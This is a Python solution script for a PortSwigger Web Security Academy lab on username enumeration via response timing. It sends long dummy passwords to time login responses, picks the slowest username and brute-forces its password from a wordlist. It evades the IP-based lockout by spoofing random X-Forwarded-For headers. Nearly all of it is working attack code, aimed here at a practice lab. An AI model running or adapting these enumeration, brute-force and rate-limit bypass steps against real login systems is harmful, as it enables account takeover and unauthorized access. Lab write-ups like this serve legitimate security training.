import random
import time
from collections import defaultdict

import requests

''' https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing '''

'''
 This lab is vulnerable to username enumeration using its response times. To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.

    Your credentials: wiener:peter
    Candidate usernames [https://portswigger.net/web-security/authentication/auth-lab-usernames]
    Candidate passwords [https://portswigger.net/web-security/authentication/auth-lab-passwords]

  Hint
    To add to the challenge, the lab also implements a form of IP-based brute-force protection. However, this can be easily bypassed by manipulating HTTP request headers.

'''

# remember to change the url
url = "https://0a1800c703b167f08154c52500ec0046.web-security-academy.net/"
endpoint = "login"


def main():
    """
    The site is vulnerable to timing attacks.
    A request for a not existing user is faster than for an existing user, allowing to enumerate the usernames.
    This reduces the number of attempts to find a valid user:password pair.
    """

    assert requests.get(url=url).status_code == 200  # check if the server is up

    print("Step 1: Find the correct username...")
    username = get_username()

    print(f"Step 2: Try all known passwords for username '{username}'...")
    password = try_passwords(username)

    print(f"{username}:{password}")


def get_username():
    attempts = defaultdict(list)

    for _ in range(3):

        with open("burp_academy_usernames", "r") as usernames:
            for username in usernames:
                username = username.strip()

                # to circumvent the IP block
                headers = {
                    "X-Forwarded-For": ip_fake_random(),
                }

                data = {
                    "username": username,
                    "password": "A" * 250,
                    # the longer the (wrong) password, the clearer the difference in response time
                }

                res = requests.post(url=url + endpoint, headers=headers, data=data)

                if "Invalid username or password." in res.text:
                    print(".", end="")
                    attempts[username].append(res.elapsed.total_seconds())
                    time.sleep(random.uniform(0.1, 0.5))
                elif "You have made too many incorrect login attempts." in res.text:
                    print(username, "too many incorrect login attempts.")
                else:
                    print(res.text)

        print("")

    averages_sorted = get_averages_sorted(attempts)

    print("Notice that the average time for the correct username is significant higher:")
    print(averages_sorted)

    slowest = get_slowest(averages_sorted)
    print(f"'{slowest}' is the slowest unknown username.")

    return slowest


def try_passwords(username):
    with open("burp_academy_passwords", "r") as passwords:
        for password in passwords.readlines():
            password = password.strip()

            data = {
                "username": username,
                "password": password,
            }

            headers = {
                "X-Forwarded-For": ip_fake_random(),
            }

            res = requests.post(url=url + endpoint, data=data, headers=headers)

            if "Invalid username or password." in res.text:
                print(".", end="")
                time.sleep(random.uniform(0.1, 0.5))
            elif "You have made too many incorrect login attempts." in res.text:
                print(username, "too many incorrect login attempts.")
            else:
                print("Found!")
                return password


def get_averages_sorted(attempts):
    averages = defaultdict(list)

    for username, times in attempts.items():
        average = sum(times) / len(times)
        averages[average].append(username)

    return sorted(averages.items(), reverse=True)


def get_slowest(averages_sorted):
    assert len(averages_sorted[0][1]) == 1  # there should be only one username with the highest average time

    fastest_name = averages_sorted[0][1][0]
    second_fastest_name = averages_sorted[1][1][0]

    fastest = [fastest_name, second_fastest_name]
    fastest.remove('wiener')  # wiener is a correct username, but not the one looked for
    return fastest[0]


def ip_fake_random():
    """
    Generate a random "IP address"
    """
    ip1 = random.choice(range(255))
    ip2 = random.choice(range(255))
    ip3 = random.choice(range(255))
    ip4 = random.choice(range(255))
    return f"{ip1}.{ip2}.{ip3}.{ip4}"


if __name__ == '__main__':
    main()
